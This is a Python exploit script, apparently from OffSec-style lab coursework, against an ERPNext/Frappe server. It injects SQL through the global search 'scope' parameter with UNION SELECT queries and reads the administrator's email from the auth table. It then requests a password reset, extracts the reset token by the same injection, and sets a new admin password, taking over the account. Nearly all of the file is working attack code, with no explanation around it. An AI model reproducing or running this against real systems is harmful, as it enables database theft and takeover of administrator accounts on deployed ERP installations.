import urllib3
import requests
import json


s = requests.session()
host = "http://erpnext:8000"
proxies = {
  "http": "http://127.0.0.1:8080"
}

def inject(payload):
    data = {"cmd": "frappe.utils.global_search.web_search",
			"text": "text",
			"scope": "text\" UNION ALL SELECT 1,2,3,4,%s#" % payload
	}
    request = s.post(host, data)
    response = request.text
    if request.status_code == 200:
	    return response
    else:
	    print("[!] Error in inject method.")


def identifyCollation():
  collation_request = inject('COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"')
  data = json.loads(collation_request)
  collation_value = data['message'][0]['route']
  return collation_value

def getAdminMailAdress():
  adminEmailAdressResponse = inject("name COLLATE utf8mb4_general_ci FROM __Auth")
  data = json.loads(adminEmailAdressResponse)
  adminEmailAdressValue = data['message'][1]['route']
  return adminEmailAdressValue
  
def sendPasswordResetRequest(emailAdress):
  host = "http://erpnext:8000/"
  data = {'cmd': 'frappe.core.doctype.user.user.reset_password',
		      'user': emailAdress}
  s.post(host, data)
  #add assertion later

def getPasswordResetToken():
    data = {"cmd": "frappe.utils.global_search.web_search",
            "text": "text",
            "scope": "offsec_scope\" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"
  	}
    request = s.post(host, data)
    response = request.text
    if request.status_code == 200:
      data = json.loads(response)
      print(response)
      tokenValue = data['message'][2]['route']
      print(response)
      return tokenValue
    else:
	    print("[!] Error in PRT method.")

def resetPassword(token):
	newpass = "QWERTYqwerty12345@"
	data = {'key': token,
          'old_password': '',
          'new_password': newpass,
          'logout_all_sessions': '1',
          'cmd': 'frappe.core.doctype.user.user.update_password'}
	request = s.post(host, data,proxies=proxies)
	response = request.text
	if request.status_code == 200:
		return newpass
	else:
		print("\n[!] Unexpected error.")


#response = inject("ascii('B')")
#collation = identifyCollation()

#test = inject("reset_password_key COLLATE utf8mb4_general_ci FROM tabUser")
#print(test)
adminEmailAdress = getAdminMailAdress()
sendPasswordResetRequest(adminEmailAdress)
resetToken = getPasswordResetToken()
print(resetToken)
resetPassword(resetToken)
print(resetPassword)
#checkNewCredentialsValidity(username, password)


#print(adminEmailAdress)
#print(resetToken)